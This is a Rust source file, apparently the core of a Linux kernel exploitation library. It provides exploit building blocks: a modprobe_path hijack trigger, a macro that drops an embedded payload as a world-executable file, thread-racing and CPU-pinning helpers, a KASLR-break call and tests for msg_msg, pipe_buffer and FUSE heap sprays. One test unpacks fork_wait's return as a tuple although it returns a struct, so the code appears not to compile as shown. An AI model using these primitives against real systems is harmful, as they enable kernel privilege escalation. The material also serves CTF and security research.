//! Write memory safe(ish) exploits for our favorite memory unsafe kernel
pub mod freelist;
pub mod spray;
pub mod uarch;

use affinity;
use std::os::unix::prelude::PermissionsExt;
use std::sync::{Arc, Barrier};
use std::{fs::File, io::Write, path::Path};

pub mod prelude {
    pub use crate::lk::{
        write_modprobe_trigger,
        fork_wait,
        pin_cpu,
        sleep,
        xxd,
        un64,
        p64,
        uarch::break_kaslr,
    };
    pub use crate::drop_file;
}

/// Pin process to a specific CPU thread
///
/// Args:
/// * `cpu_idx` - The hardware thread to pin the current process to
pub fn pin_cpu(cpu_idx: usize) {
    let mut cpu_set: Vec<usize> = (0..affinity::get_core_num()).collect();
    cpu_set[cpu_idx] = 1;
    affinity::set_thread_affinity(cpu_set)
        .expect(&format!("Failed to pin exploit to cpu thread: {cpu_idx}"))
}

pub struct StalledThread<T>  {
    _thread: std::thread::JoinHandle<T>,
    barrier: Arc<Barrier>
}

impl<T> StalledThread<T> {
    pub fn resume(&self) {
        self.barrier.wait();
    }
}

/// Spawn a thread that waits on a value to be updated before running the closure
///
/// Args:
/// * `f` - Closure containing code to execute in the thread when the syncing object is updated
///
/// Return:
/// * Thread handle, and a reference counted Barrier the thread is waiting on.
///   Calling `.wait()` on the returned barrier will resume this thread.
pub fn fork_wait<F, T>(f: F) -> StalledThread<T>
where
    F: FnOnce() -> T + std::marker::Send + 'static,
    T: std::marker::Send + 'static,
{
    let barrier = Arc::new(Barrier::new(2));
    let barrier_thread = barrier.clone();

    let thread = std::thread::spawn(move || -> T {
        barrier_thread.wait();
        f()
    });
    return StalledThread { _thread: thread, barrier }
}

/// Sleep for some number of seconds
///
/// Args:
/// * `seconds` - The number of seconds to sleep for
pub fn sleep(seconds: u64) {
    std::thread::sleep(std::time::Duration::from_secs(seconds));
}

/// Create a file with an invalid header to trigger a hijacked modprobe_path
///
/// Args:
/// * `path` - The path to drop the trigger file
pub fn write_modprobe_trigger(path: &Path) -> std::io::Result<()> {
    let mut modprobe_file = File::create(path)?;
    modprobe_file.write_all(b"\xff\xff\xff\xff")?;

    let mut perms = modprobe_file.metadata()?.permissions();
    perms.set_mode(0o777);
    modprobe_file.set_permissions(perms)?;

    drop(modprobe_file);

    Ok(())
}

/// Include a file into the binary at compile time and drop it at runtime
///
/// Args:
/// * `include_path` - Path of the file to include at compile time
/// * `drop_path` - Path to drop the file's contents at runtime
#[macro_export]
macro_rules! drop_file {
    ($include_path:expr, $drop_path:expr) => {
        // File contents included at compile time
        const FILE_CONTENTS: &[u8] = include_bytes!($include_path);

        // Write the contents to the specified path
        let mut file = File::create($drop_path).expect(&format!(
            "Failed to create file being dropped at {}",
            $drop_path
        ));

        let metadata = file.metadata().expect("drop_file: metdata error");
        let mut permissions = metadata.permissions();
        permissions.set_mode(0o777);

        let _ = file.write_all(FILE_CONTENTS).expect(&format!(
            "Failed to write to file being dropped at {}",
            $drop_path
        ));
    };
}

pub fn xxd(data: &[u8]) {
    if data.len() % 8 != 0 {
        panic!("xxd expects data to be 8 byte aligned")
    }

    let mut address = 0;
    while address < data.len() {
        print!("{:016x}: ", address);

        print!("0x");
        for i in (0..8).rev() {
            print!("{:02x}", data[address+i]);
        }

        if address + 8 >= data.len() {
            println!("");
            break;
        }

        print!("      0x");
        for i in (8..16).rev() {
            print!("{:02x}", data[address+i]);
        }

        println!();
        address += 16;
    }

}

pub fn un64(bytevec: &[u8]) -> u64 {
    if bytevec.len() != 8 {
        panic!("Expected 8 bytes!");
    }
    let mut val = 0u64;
    for i in 0..8 {
        val |= (bytevec[i] as u64) << (i*8);
    }

    val
}

pub fn p64(val: u64) -> Vec<u8> {
    let mut bytevec = vec![0; 8];
    for i in 0..8 {
        bytevec[i] = (val >> (i*8)) as u8;
    }

    bytevec
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    #[test]
    fn test_swab() {
        let swabbed = freelist::swab(0x4142434445464748);
        assert_eq!(swabbed, 0x4847464544434241);
    }

    #[test]
    fn test_pin_cpu() {
        pin_cpu(0);
    }

    #[test]
    fn test_modprobe_write() {
        write_modprobe_trigger(Path::new("/tmp/modprobe"))
            .expect("could not write modprobe trigger file");
    }

    #[test]
    fn test_fuse_mount() {
        // struct FuseReadHandler;
        // impl spray::fuse::FuseReadHandler for FuseReadHandler {
        //     fn on_read(&mut self) {
        //         println!("hit custom fuse handler!");
        //     }
        // }
        // let fs = spray::fuse::FuseFS {
        //     handler: FuseReadHandler,
        // };
        // let fuse_handle = spray::univ::setup_univ_spray("/tmp/fuse", fs);

        // // touch the fuse memory to make sure it works
        // // the print should be visible when the test is run like:
        // // cargo test test_fuse_mount -- --nocapture
        // unsafe {
        //     libc::memcpy(fuse_handle.addr, fuse_handle.addr.add(0x1000), 0x8);
        // }

        // drop(fuse_handle);
    }

    #[test]
    fn test_fork_wait() {
        let (_handle, barrier) = fork_wait(|| {
            println!("child: continued!");
        });

        // wait a second
        std::thread::sleep(Duration::from_secs(1));

        // notify fork_wait to continue, doesn't stop parent
        barrier.wait();

        println!("parent: continued!");
    }

    #[test]
    fn test_break_kaslr() {
        pin_cpu(0);
        println!("{:x}", uarch::break_kaslr(0x1400000));
    }

    #[test]
    fn test_msg_msg() {
        let q = spray::msgmsg::MsgQueue::new();
        let msg = spray::msgmsg::Msg {
            mtype: 1,
            mtext: "asdf".into(),
        };
        q.send(&msg);

        let received = q.recv_copy(4);
        assert!(received.mtext == "asdf".as_bytes());

        let received = q.recv(4);
        assert!(received.mtext == "asdf".as_bytes());
    }

    #[test]
    fn test_pipe_buffer() {
        let p = spray::pipe_buffer::PipeBufferSpray::new(32);

        p.resize_all(0x1000 * 2);

        let data = vec![0x41;0x1000 * 2];
        p.write_to_all(&data);

        p.close_all();
    }
}
